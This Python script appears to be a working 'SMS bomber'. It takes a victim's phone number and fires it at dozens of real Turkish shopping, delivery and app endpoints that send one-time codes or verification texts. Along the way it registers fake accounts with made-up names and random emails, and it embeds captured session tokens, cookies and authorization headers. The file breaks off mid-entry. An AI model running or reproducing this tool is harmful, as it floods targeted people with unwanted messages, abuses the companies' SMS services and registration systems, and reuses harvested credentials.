import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style
import os

banner = """
                     .   ·     ·   . 
                 .·´                 `·. 
                /.· .             . ·.  '\ 
               '| (¯è ·._|_ . ·é¯)    |       
                \        ¯¯            '/ 
                  `·.   ¯¯¯`       .·´ 
                      `   ·    ·  ´-exancodex
discord=> serkanth                                                                                          
"""

# Clear the console after defining the banner
os.system('cls')
print(banner)

phone = input('PhoneNumber: ')

random_mail = ''.join(choice(ascii_lowercase) for i in range(20))
adet = 0

# dsmartgo.com.tr  
dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
    "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
    "IsSubscriber": "true",
    "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
    "Mobile": phone,
}, cookies={
    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
    "_ga": "GA1.3.1016548678.1638216163",
    "_gat": "1",
    "_gat_gtag_UA_18913632_14": "1",
    "_gid": "GA1.3.1214889554.1638216163",
    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
})

try:
    info_text = BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"})
    if info_text:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
    else:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr")
except AttributeError:
    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr")   
# kigili.com   
try:
    kigili = requests.post("https://www.kigili.com/users/registration/", data={
        "first_name": "Memati",
        "last_name": "Bas",
        "email": f"{random_mail}@gmail.com",
        "phone": f"0{phone}",
        "password": "31ABC..abc31",
        "confirm": "true",
        "kvkk": "true",
        "next": ""
    })
    if kigili.status_code == 202:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com")
    
#kahvedunyasi.com   
try:    
    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
        "mobile_number": phone,
        "token_type": "register_token"
    })
    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com")
        
    else:
        raise
except:    
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com")
    

#podyumplus.com   
try:
    url = f"https://www.podyumplus.com:443/index.php?route=account/account/control&telephone={phone}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://www.podyumplus.com/giris-yap", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
    r = requests.get(url, headers=headers)
    if (r.json()["success"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> podyumplus.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> podyumplus.com")
    
#naosstars.com

try:
    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
        "email": f"{random_mail}@gmail.com",
        "first_name": "Memati",
        "last_name": "Bas",
        "password": "31ABC..abc31",
        "date_of_birth": "1975-12-31",
        "phone": f"0{phone}",
        "gender": "male",
        "kvkk": "true",
        "contact": "true",
        "confirm": "true"
    })
    if naosstars.status_code == 202:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com")
         
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com")
      
    
#wmf.com.tr

try:
    wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
        "confirm": "true",
        "date_of_birth": "1956-03-01",
        "email": f"{random_mail}@gmail.com",
        "email_allowed": "true",
        "first_name": "Memati",
        "gender": "male",
        "last_name": "Bas",
        "password": "31ABC..abc31",
        "phone": f"0{phone}"
    })
    if wmf.status_code == 202:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr")
           
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr")
     

#istegelsin.com

try:
    json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(phone)}}
    r = requests.post("https://prod.fasapi.net:443/",  json=json)
    if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> prod.fasapi.net")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> prod.fasapi.net")


#bim
try:
    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": phone})
    if bim.status_code == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net")
        
    
#ceptesok.com
try:
    r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": phone, "token_type": "register_token"})
    if len(r.json()["meta"]["messages"]["success"]) != 0:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.ceptesok.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com")
        

#tiklagelsin.com
try:
    json={"operationName": "GENERATE_OTP", 
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                            "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                            "phone": phone
                            }
                }
    tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
    if tiklagelsin.json()["data"]["generateOtp"] == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> svc.apps.tiklagelsin.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> svc.apps.tiklagelsin.com")
        

#migros.com.tr

try:
    migros = requests.post("https://rest.sanalmarket.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": phone})
    if migros.json()["successful"] == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rest.sanalmarket.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rest.sanalmarket.com.tr")
        

#a101.com.tr
try:
    url = "https://www.a101.com.tr:443/users/otp-login/"
    data = {"phone": f"0{phone}", "next": "/a101-kapida"}
    r = requests.post(url,data=data)
    if (r.status_code) == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr")
        
    else:
        raise 
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr")
#englishhome.com

try:
    data = {"first_name": "Memati", "last_name": "Bas", "email": f"{random_mail}@gmail.com", "phone": f"0{phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
    if home.status_code == 202:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com")
        
        
#sakasu.com.tr
try:
    data = {"phone": phone}
    su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
    if su.json()["status"] == "ok":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr")
        

#rentiva.com

try:
    url = "https://rentiva.com:443/api/Account/Login"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
    json={"phone": phone, "phonePeriod": "never"}
    rentiva = requests.post(url, headers=headers, json=json)
    if rentiva.json()["success"] == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com")
        

#bineq.tech
try:
    url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={phone}"
    bineq = requests.post(url)
    if bineq.json()["IsSuccess"] == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bineqapi.heymobility.tech")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineqapi.heymobility.tech")
        
        
#superpedestrian.com
try:
    url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
    json={"phone_number": f"+90{phone}"}
    link = requests.post(url, json=json)
    if link.json()["detail"] == "Ok":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> consumer-auth.linkfleet.de")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> consumer-auth.linkfleet.de")

#apaydinsupermarket.com
try:
    r = requests.post("https://apistore.apaydinsupermarket.com:443/api/musteriGirisKayit", data={"cep_tel": str(phone)})
    if (r.json()["result"]["status"]) == "OK":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apistore.apaydinsupermarket.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apistore.apaydinsupermarket.com")
            
        
#loncamarket.com
try:
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
    json={"Address": phone, "ConfirmationType": 0}
    lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False)
    if lonca.status_code == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> loncamarket.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com")   
        

#dgnonline.com
try:
    url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
    data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": phone}
    dgn = requests.post(url, headers=headers, data=data)
    if dgn.status_code == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> odeme.dgnonline.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> odeme.dgnonline.com")  
        

#yaanimail.com
try:
    url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
    json={"action": "create", "email": f"{random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": "a@gmail.com"}, {"type": "msisdn", "value": f"90{phone}"}]}
    r = requests.post(url, headers=headers, json=json)
    if r.status_code == 204:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.yaanimail.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.yaanimail.com")  
        
         
#defacto.com.tr
try:
    url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
    data = {"mobilePhone": phone}
    r = requests.post(url, headers=headers, data=data)
    if r.json()["Data"]["IsSMSSend"] == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr")


#mopas.com.tr
try:
    r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone}&pwd=&checkPwd=")
    if r.status_code == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr")
        

#icq.net
try:
    url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
    json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{phone}", "route": "sms"}, "reqId": "25299-1669396271"}
    r = requests.post(url, headers=headers, json=json)
    if r.json()["status"]["code"] == 20000:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> u.icq.net")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> u.icq.net")
        

#boyner.com
try:
    url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
    json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": phone, "day": "31", "Email": random_mail+"@gmail.com", "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
    r = requests.post(url, headers=headers, json=json)
    if r.json()["Success"] == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com")
        
#watsons.com.tr
try:
    url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
    json={"countryCode": "TR", "phoneNumber": phone}
    r = requests.post(url, headers=headers, json=json)
    if r.status_code == 201:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr")
        

#buyursungelsin.com
try:
    url = "https://app.buyursungelsin.com:443/api/customer/form/check"
    headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
    data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
    r = requests.post(url, headers=headers, data=data)
    if (r.status_code) == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.buyursungelsin.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com")
        

#idealdata.com.tr
try:
    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{random_mail}@gmail.com%020{phone}")
    if r.status_code == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr")
        

#pinarsu.com.tr
try:
    url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
    headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
    json={"MobilePhone": phone}
    r = requests.post(url, headers=headers, json=json)
    if r.text == "true":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pinarsumobileservice.yasar.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pinarsumobileservice.yasar.com.tr")
        

#suiste.com
try:
    url = "https://suiste.com:443/api/auth/code"
    headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
    data = {"action": "register", "gsm": phone}
    r = requests.post(url, headers=headers, data=data)
    if r.json()["code"] == "common.success":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suiste.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com")
        
        
#hayatsu.com.tr
try:
    url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
    json={"mobilePhoneNumber": phone}
    r = requests.post(url, json=json)
    if (r.json()["IsSuccessful"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hayatsu.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr")
        
        
#pisir.com
try:
    r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "336", "app_platform": "ios", "msisdn": f"+90{phone}"})
    if r.json()["ok"] == "1":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.pisir.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.pisir.com")
            

#KimGbIster
try:
    r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{phone}"})
    if r.status_code == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
#ikinciyeni.com
try:
    url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
    json={"accounttype": 1, "email": f"{random_mail}@gmail.com", "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": phone}
    r = requests.post(url, json=json)
    if (r.json()["isSucceed"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apigw.ikinciyeni.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com")
        
        
#terrapizza.com.tr
try:
    url = "https://api.terrapizza.com.tr:443/api/v1/customers"
    json={"email": f"{random_mail}@gmail.com", "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
    r = requests.post(url,  json=json)
    if (r.status_code) == 201:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.terrapizza.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.terrapizza.com.tr")
        
        
#ipragaz.com.tr
try:
    url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
    json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(phone), "playerId": ""}
    r = requests.post(url, json=json)
    if (r.json()["phoneNumber"]) == str(phone):
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ipapp.ipragaz.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr")
        
        
#aygaz.com.tr
try:
    url = "https://ecommerce-memberapi.aygaz.com.tr:443/api/Membership/SendVerificationCode"
    json={"Gsm": str(phone)}
    r = requests.post(url, json=json)
    if (r.json()["IsSuccess"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ecommerce-memberapi.aygaz.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ecommerce-memberapi.aygaz.com.tr")
        
        
#mogazmobilapinew.aygaz.com.tr
try:
    url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
